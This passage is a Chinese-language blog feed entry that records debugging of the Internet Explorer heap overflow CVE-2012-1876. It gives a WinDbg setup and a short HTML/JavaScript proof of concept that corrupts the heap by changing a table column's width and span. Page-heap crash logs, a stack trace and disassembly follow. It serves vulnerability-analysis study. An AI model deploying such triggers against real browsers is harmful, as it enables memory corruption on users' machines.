        &lt;h1 id=&quot;手把手教你构建-C-语言编译器（解释器）学习笔记&quot;&gt;&lt;a href=&quot;#手把手教你构建-C-语言编译器（解释器）学习笔记&quot; class=&quot;headerlink&quot; title=&quot;手把手教你构建 C 语言编译器（解释器）学习笔记&quot;&gt;&lt;/a&gt;手把手教你构建 C 语言编译
      
    
    </summary>
    
      <category term="读书笔记" scheme="http://eternalsakura13.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞战争：CVE-2012-1876调试笔记</title>
    <link href="http://eternalsakura13.com/2018/03/10/cve2012_1876/"/>
    <id>http://eternalsakura13.com/2018/03/10/cve2012_1876/</id>
    <published>2018-03-10T06:52:54.999Z</published>
    <updated>2018-03-17T19:28:16.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。<br>因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.dbgtech.net/windbghelp/index.html" target="_blank" rel="noopener">windbg在线手册</a></li><li>漏洞战争</li><li><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/cve_2012_1876/Advanced%20Exploitation%20of%20Internet%20Explorer%20Heap%20Overflow.pdf" target="_blank" rel="noopener">vupen Advanced Exploitation of Internet Explorer Heap Overflow</a></li></ul><h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul><li>win7 32位:<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|e812fbe758f05b485c5a858c22060785|h=S5RNBL5JL5NRC3YMLDWIO75YY3UP4ET5|/" target="_blank" rel="noopener">下载链接</a></li><li>windbg6.1:<a href="https://pan.baidu.com/s/13nzTnsmmWDJoJRSBsb_ZPw" target="_blank" rel="noopener">下载链接</a></li></ul><h3 id="windbg符号文件设置"><a href="#windbg符号文件设置" class="headerlink" title="windbg符号文件设置"></a>windbg符号文件设置</h3><p>在windbg的窗口里输入<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>重启后要重新输入。</p><h2 id="poc调试"><a href="#poc调试" class="headerlink" title="poc调试"></a>poc调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;table style=<span class="string">"table-layout:fixed"</span> &gt;</span><br><span class="line">        &lt;col id=<span class="string">"132"</span> width=<span class="string">"41"</span> span=<span class="string">"1"</span> &gt;&amp;nbsp &lt;<span class="regexp">/col&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>table&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">        obj_col.width = <span class="string">"42765"</span>;</span><br><span class="line">        obj_col.span = <span class="number">1000</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> setTimeout(<span class="string">"over_trigger();"</span>,<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>body&gt;</span><br><span class="line"> &lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>基于HPA的漏洞分析方法</p><ul><li>hpa：启动页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</li></ul><p>在终端通过gflags启动hpa<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-065200.png" alt=""><br>启动ie浏览器后，用windbg attach进程<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-065933.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-070005.png" alt=""><br>两个进程，一个是broker进程 一个是页面的内容进程，附加后面的那个就可以，就是内容进程。<br>检查一下hpa开了没。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .symfix</span><br><span class="line">0:000&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">.............................</span><br><span class="line">0:000&gt; !gflag</span><br><span class="line">Current NtGlobalFlag contents: 0x02000000</span><br><span class="line">    hpa - Place heap allocations at ends of pages</span><br></pre></td></tr></table></figure></p><p>然后需要开启子进程调试，这样才能断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.childdbg 1</span><br></pre></td></tr></table></figure></p><p>然后g，启动调试器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:027&gt; g</span><br><span class="line">ModLoad: 74c30000 74c38000   C:\Windows\system32\credssp.dll</span><br><span class="line">ModLoad: 752a0000 752a8000   C:\Windows\system32\secur32.dll</span><br><span class="line">ModLoad: 750c0000 750f8000   C:\Windows\system32\ncrypt.dll</span><br><span class="line">ModLoad: 750a0000 750b7000   C:\Windows\system32\bcrypt.dll</span><br><span class="line">ModLoad: 74c70000 74cad000   C:\Windows\system32\bcryptprimitives.dll</span><br><span class="line">ModLoad: 74b50000 74b66000   C:\Windows\system32\GPAPI.dll</span><br><span class="line">ModLoad: 70c60000 70c7c000   C:\Windows\system32\cryptnet.dll</span><br><span class="line">ModLoad: 72e70000 72e85000   C:\Windows\system32\Cabinet.dll</span><br><span class="line">ModLoad: 74d10000 74d1e000   C:\Windows\system32\DEVRTL.dll</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-070815.png" alt=""><br>看到debugger正在运行了。<br>然后把poc拖到浏览器里运行。<br>另外poc拖进去之后，会自动断下来。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-071745.png" alt=""><br>再g一下，就变成下面这个样子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1:021&gt; g</span><br><span class="line">ModLoad: 760f0000 7610f000   C:\Windows\system32\IMM32.DLL</span><br><span class="line">ModLoad: 75b40000 75c0c000   C:\Windows\system32\MSCTF.dll</span><br><span class="line">ModLoad: 6ccf0000 6d76c000   C:\Windows\system32\IEFRAME.dll</span><br><span class="line">ModLoad: 75da0000 75da5000   C:\Windows\system32\PSAPI.DLL</span><br><span class="line">ModLoad: 72940000 7297c000   C:\Windows\system32\OLEACC.dll</span><br><span class="line">ModLoad: 741a0000 7433e000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc\comctl32.dll</span><br><span class="line">ModLoad: 75810000 7588b000   C:\Windows\system32\comdlg32.dll</span><br><span class="line">ModLoad: 71620000 71655000   C:\Program Files\Internet Explorer\IEShims.dll</span><br><span class="line">ModLoad: 75460000 7546c000   C:\Windows\system32\CRYPTBASE.dll</span><br><span class="line">ModLoad: 74390000 743d0000   C:\Windows\system32\uxtheme.dll</span><br><span class="line">ModLoad: 75500000 7550e000   C:\Windows\system32\RpcRtRemote.dll</span><br><span class="line">ModLoad: 735b0000 735c3000   C:\Windows\system32\dwmapi.dll</span><br><span class="line">ModLoad: 723c0000 723f3000   C:\Program Files\Internet Explorer\sqmapi.dll</span><br><span class="line">ModLoad: 74f90000 74fa6000   C:\Windows\system32\CRYPTSP.dll</span><br><span class="line">ModLoad: 76170000 7630d000   C:\Windows\system32\SETUPAPI.dll</span><br><span class="line">ModLoad: 756b0000 756d7000   C:\Windows\system32\CFGMGR32.dll</span><br><span class="line">ModLoad: 756e0000 756f2000   C:\Windows\system32\DEVOBJ.dll</span><br><span class="line">ModLoad: 74d30000 74d6b000   C:\Windows\system32\rsaenh.dll</span><br><span class="line">ModLoad: 764a0000 76523000   C:\Windows\system32\CLBCatQ.DLL</span><br><span class="line">ModLoad: 743f0000 744e5000   C:\Windows\system32\propsys.dll</span><br><span class="line">ModLoad: 6f9e0000 6fa0b000   C:\Program Files\Internet Explorer\ieproxy.dll</span><br><span class="line">ModLoad: 772c0000 773b4000   C:\Windows\system32\WININET.dll</span><br><span class="line">ModLoad: 76490000 76493000   C:\Windows\system32\Normaliz.dll</span><br><span class="line">ModLoad: 75510000 7551b000   C:\Windows\system32\profapi.dll</span><br><span class="line">ModLoad: 753f0000 7540a000   C:\Windows\system32\SspiCli.dll</span><br><span class="line">ModLoad: 75db0000 75de5000   C:\Windows\system32\ws2_32.DLL</span><br><span class="line">ModLoad: 759f0000 759f6000   C:\Windows\system32\NSI.dll</span><br><span class="line">ModLoad: 74e10000 74e54000   C:\Windows\system32\dnsapi.DLL</span><br><span class="line">ModLoad: 739a0000 739bc000   C:\Windows\system32\iphlpapi.DLL</span><br><span class="line">ModLoad: 73980000 73987000   C:\Windows\system32\WINNSI.DLL</span><br><span class="line">ModLoad: 6d920000 6d94e000   C:\Windows\system32\MLANG.dll</span><br><span class="line">ModLoad: 75410000 7545b000   C:\Windows\system32\apphelp.dll</span><br><span class="line">ModLoad: 73fe0000 74001000   C:\Windows\system32\ntmarta.dll</span><br><span class="line">ModLoad: 77500000 77545000   C:\Windows\system32\WLDAP32.dll</span><br><span class="line">ModLoad: 74a10000 74a19000   C:\Windows\system32\VERSION.dll</span><br><span class="line">ModLoad: 67b10000 680c2000   C:\Windows\System32\mshtml.dll</span><br><span class="line">ModLoad: 6e2c0000 6e2ea000   C:\Windows\System32\msls31.dll</span><br><span class="line">ModLoad: 75470000 754cf000   C:\Windows\system32\SXS.DLL</span><br><span class="line">ModLoad: 71270000 712a2000   C:\Windows\system32\WINMM.dll</span><br><span class="line">ModLoad: 744f0000 74529000   C:\Windows\system32\MMDevAPI.DLL</span><br><span class="line">ModLoad: 6daf0000 6db20000   C:\Windows\system32\wdmaud.drv</span><br><span class="line">ModLoad: 6dae0000 6dae4000   C:\Windows\system32\ksuser.dll</span><br><span class="line">ModLoad: 74730000 74737000   C:\Windows\system32\AVRT.dll</span><br><span class="line">ModLoad: 6db20000 6db56000   C:\Windows\system32\AUDIOSES.DLL</span><br><span class="line">ModLoad: 74760000 7476b000   C:\Windows\system32\msimtf.dll</span><br><span class="line">ModLoad: 6dad0000 6dad8000   C:\Windows\system32\msacm32.drv</span><br><span class="line">ModLoad: 6dab0000 6dac4000   C:\Windows\system32\MSACM32.dll</span><br><span class="line">ModLoad: 6daa0000 6daa7000   C:\Windows\system32\midimap.dll</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-071854.png" alt=""><br>然后允许ActiveX控件运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(4b8.c00): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=06caf000 edi=06caf018</span><br><span class="line">eip=67f3f167 esp=0452daa8 ebp=0452dab4 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx  ds:0023:06caf018=????????</span><br></pre></td></tr></table></figure></p><p>然后kb回溯一下栈<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:<span class="number">025</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0452</span>dab4 <span class="number">67</span>db5b8e <span class="number">00414114</span> <span class="number">0452</span>ddf8 <span class="number">00000001</span> mshtml!CTableColCalc::AdjustForCol+<span class="number">0x15</span></span><br><span class="line"><span class="number">0452</span>db64 <span class="number">67</span>c20713 <span class="number">00000001</span> <span class="number">0452</span>ddf8 <span class="number">000003e8</span> mshtml!CTableLayout::CalculateMinMax+<span class="number">0x52f</span></span><br><span class="line"><span class="number">0452</span>dd80 <span class="number">67</span>c0af19 <span class="number">0452</span>ddf8 <span class="number">0452</span>ddc4 <span class="number">00000001</span> mshtml!CTableLayout::CalculateLayout+<span class="number">0x276</span></span><br><span class="line"><span class="number">0452</span>df2c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452e158</span> <span class="number">00000000</span> mshtml!CTableLayout::CalcSizeVirtual+<span class="number">0x720</span></span><br><span class="line"><span class="number">0452e064</span> <span class="number">67</span>cef5d0 <span class="number">06e19</span>ea8 <span class="number">00000000</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452e128</span> <span class="number">67</span>cef31d <span class="number">06e19</span>ea8 <span class="number">0001769</span>c <span class="number">0001769</span>c mshtml!CFlowLayout::MeasureSite+<span class="number">0x312</span></span><br><span class="line"><span class="number">0452e170</span> <span class="number">67</span>cef664 <span class="number">0779b</span>f00 <span class="number">00000061</span> <span class="number">0452f</span>5a0 mshtml!CFlowLayout::GetSiteWidth+<span class="number">0x156</span></span><br><span class="line"><span class="number">0452e1</span>b0 <span class="number">67</span>cefb40 <span class="number">07b</span>fafb0 <span class="number">06e19</span>ea8 <span class="number">00000001</span> mshtml!CLSMeasurer::GetSiteWidth+<span class="number">0xce</span></span><br><span class="line"><span class="number">0452e234</span> <span class="number">6e2</span>c665d <span class="number">07862f</span>f8 <span class="number">0452e254</span> <span class="number">0452e318</span> mshtml!CEmbeddedILSObj::Fmt+<span class="number">0x150</span></span><br><span class="line"><span class="number">0452e2</span>c4 <span class="number">6e2</span>c6399 <span class="number">07</span>c12efc <span class="number">00000000</span> <span class="number">07025</span>d20 msls31!ProcessOneRun+<span class="number">0x3e9</span></span><br><span class="line"><span class="number">0452e320</span> <span class="number">6e2</span>c6252 <span class="number">07</span>c12f18 <span class="number">00018258</span> <span class="number">00000000</span> msls31!FetchAppendEscCore+<span class="number">0x18e</span></span><br><span class="line"><span class="number">0452e374</span> <span class="number">6e2</span>c61c3 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000014</span> msls31!LsDestroyLine+<span class="number">0x47f</span></span><br><span class="line"><span class="number">0452e3</span>fc <span class="number">6e2</span>c293f <span class="number">00000007</span> <span class="number">00003832</span> <span class="number">00000000</span> msls31!LsDestroyLine+<span class="number">0x9ff</span></span><br><span class="line"><span class="number">0452e438</span> <span class="number">67</span>cedd81 <span class="number">00000001</span> <span class="number">00000007</span> <span class="number">00003832</span> msls31!LsCreateLine+<span class="number">0xcb</span></span><br><span class="line"><span class="number">0452e588</span> <span class="number">67</span>d017cc <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">07b</span>fafc0 mshtml!CLSMeasurer::LSDoCreateLine+<span class="number">0x127</span></span><br><span class="line"><span class="number">0452e62</span>c <span class="number">67</span>d01ef5 <span class="number">0452</span>ee90 <span class="number">0001769</span>c <span class="number">00000000</span> mshtml!CLSMeasurer::LSMeasure+<span class="number">0x34</span></span><br><span class="line"><span class="number">0452e674</span> <span class="number">67</span>d01db1 <span class="number">00000000</span> <span class="number">00017e6</span>c <span class="number">00000083</span> mshtml!CLSMeasurer::Measure+<span class="number">0x1e6</span></span><br><span class="line"><span class="number">0452e698</span> <span class="number">67</span>d011a2 <span class="number">00017e6</span>c <span class="number">00000083</span> <span class="number">0779b</span>f40 mshtml!CLSMeasurer::MeasureLine+<span class="number">0x1c</span></span><br><span class="line"><span class="number">0452e748</span> <span class="number">67</span>d2a8f6 <span class="number">0452</span>ec68 <span class="number">07470f</span>d8 <span class="number">00000083</span> mshtml!CRecalcLinePtr::MeasureLine+<span class="number">0x46d</span></span><br><span class="line"><span class="number">0452</span>ef50 <span class="number">67</span>d2b304 <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::RecalcLines+<span class="number">0x8bb</span></span><br><span class="line"><span class="number">0452f</span>0a0 <span class="number">67</span>d28c5c <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::UpdateView+<span class="number">0x208</span></span><br><span class="line"><span class="number">0452f</span>154 <span class="number">67</span>d29ee3 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">0873</span>cf10 mshtml!CFlowLayout::CommitChanges+<span class="number">0x9c</span></span><br><span class="line"><span class="number">0452f</span>264 <span class="number">67</span>c0eb06 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcTextSize+<span class="number">0x30f</span></span><br><span class="line"><span class="number">0452f</span>4ec <span class="number">67</span>d002ee <span class="number">0779b</span>f00 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCoreCompat+<span class="number">0x1045</span></span><br><span class="line"><span class="number">0452f</span>508 <span class="number">67</span>d00367 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCore+<span class="number">0x49</span></span><br><span class="line"><span class="number">0452f</span>544 <span class="number">67</span>d0029c <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CBodyLayout::CalcSizeCore+<span class="number">0xd8</span></span><br><span class="line"><span class="number">0452f</span>57c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeVirtual+<span class="number">0x1af</span></span><br><span class="line"><span class="number">0452f</span>6b4 <span class="number">67</span>c84121 <span class="number">0779b</span>f00 <span class="number">00000001</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452f</span>7a4 <span class="number">67</span>d290f9 <span class="number">00100000</span> <span class="number">00000007</span> <span class="number">059</span>ebeb4 mshtml!CFlowLayout::DoLayout+<span class="number">0x543</span></span><br><span class="line"><span class="number">0452f</span>7e0 <span class="number">67</span>cec8ca <span class="number">059</span>eb870 <span class="number">00100000</span> <span class="number">0452f</span>840 mshtml!CView::ExecuteLayoutTasks+<span class="number">0x3b</span></span><br><span class="line"><span class="number">0452f</span>824 <span class="number">67</span>d2336d <span class="number">00000000</span> <span class="number">0452f</span>870 <span class="number">0000008</span>d mshtml!CView::EnsureView+<span class="number">0x355</span></span><br><span class="line"><span class="number">0452f</span>848 <span class="number">67</span>ce94b2 <span class="number">059</span>eb870 <span class="number">00000000</span> <span class="number">06</span>d24d58 mshtml!CView::EnsureViewCallback+<span class="number">0xd3</span></span><br><span class="line"><span class="number">0452f</span>87c <span class="number">67</span>cd37f7 <span class="number">0452f</span>918 <span class="number">00008002</span> <span class="number">00000000</span> mshtml!GlobalWndOnMethodCall+<span class="number">0xff</span></span><br><span class="line"><span class="number">0452f</span>89c <span class="number">75</span>ce86ef <span class="number">000f</span>0402 <span class="number">00000012</span> <span class="number">00000000</span> mshtml!GlobalWndProc+<span class="number">0x10c</span></span><br><span class="line"><span class="number">0452f</span>8c8 <span class="number">75</span>ce8876 <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 <span class="number">00008002</span> USER32!InternalCallWinProc+<span class="number">0x23</span></span><br><span class="line"><span class="number">0452f</span>940 <span class="number">75</span>ce89b5 <span class="number">00000000</span> <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 USER32!UserCallWinProcCheckWow+<span class="number">0x14b</span></span><br><span class="line"><span class="number">0452f</span>9a0 <span class="number">75</span>ce8e9c <span class="number">67</span>cc1de3 <span class="number">00000000</span> <span class="number">0452f</span>a28 USER32!DispatchMessageWorker+<span class="number">0x35e</span></span><br><span class="line"><span class="number">0452f</span>9b0 <span class="number">6</span>cde04a6 <span class="number">0452f</span>9c8 <span class="number">00000000</span> <span class="number">00752f</span>58 USER32!DispatchMessageW+<span class="number">0xf</span></span><br><span class="line"><span class="number">0452f</span>a28 <span class="number">6</span>cdf0446 <span class="number">05688808</span> <span class="number">00000000</span> <span class="number">006</span>ccff0 IEFRAME!CTabWindow::_TabWindowThreadProc+<span class="number">0x452</span></span><br><span class="line"><span class="number">0452f</span>ae0 <span class="number">75f</span>549bd <span class="number">00752f</span>58 <span class="number">00000000</span> <span class="number">0452f</span>afc IEFRAME!LCIETab_ThreadProc+<span class="number">0x2c1</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> C:\Windows\system32\kernel32.dll - </span><br><span class="line"><span class="number">0452f</span>af0 <span class="number">76361174</span> <span class="number">006</span>ccff0 <span class="number">0452f</span>b3c <span class="number">7741b</span>3f5 iertutil!CIsoScope::RegisterThread+<span class="number">0xab</span></span><br><span class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">0452f</span>afc <span class="number">7741b</span>3f5 <span class="number">006</span>ccff0 <span class="number">73</span>d26994 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0x12</span></span><br><span class="line"><span class="number">0452f</span>b3c <span class="number">7741b</span>3c8 <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span></span><br><span class="line"><span class="number">0452f</span>b54 <span class="number">00000000</span> <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br></pre></td></tr></table></figure></p><p>这里可能会出现没有符号的问题，解决方法如下：<br>在windbg的窗口里输入<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>然后可以看见<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072303.png" alt=""></p><p>分析一下<br>首先导致崩溃的（分析内容在下述代码注释了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; uf mshtml!CTableColCalc::AdjustForCol</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">67f3f152 8bff            mov     edi,edi</span><br><span class="line">67f3f154 55              push    ebp</span><br><span class="line">67f3f155 8bec            mov     ebp,esp</span><br><span class="line">67f3f157 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">67f3f159 53              push    ebx</span><br><span class="line">67f3f15a 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">67f3f15d 57              push    edi</span><br><span class="line">67f3f15e 8bc1            mov     eax,ecx</span><br><span class="line">67f3f160 83e00f          and     eax,0Fh</span><br><span class="line">67f3f163 8d7e18          lea     edi,[esi+18h]；可以看到edi来源于esi，但是esi的处理代码并不在这个函数里，所以继续向上回溯。</span><br><span class="line">67f3f166 50              push    eax</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx；向edi指向的内存里拷贝值导致crash</span><br><span class="line">67f3f169 e89eacdbff      call    mshtml!CUnitValue::IsScalerUnit (67cf9e0c)</span><br><span class="line">67f3f16e 85c0            test    eax,eax</span><br><span class="line">67f3f170 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (67f3f183)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>这样就清楚了，我们要在上一个函数下断。<br>重启一下windbg，重新attach<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">0:021&gt; sxe ld:mshtml</span><br><span class="line">0:021&gt; g</span><br></pre></td></tr></table></figure></p><p>这个时候把poc拖进去（注意到没有提示允许activeX运行）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">Page heap: pid 0xDC4: page heap enabled with flags 0x3.</span><br><span class="line">(dc4.e34): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 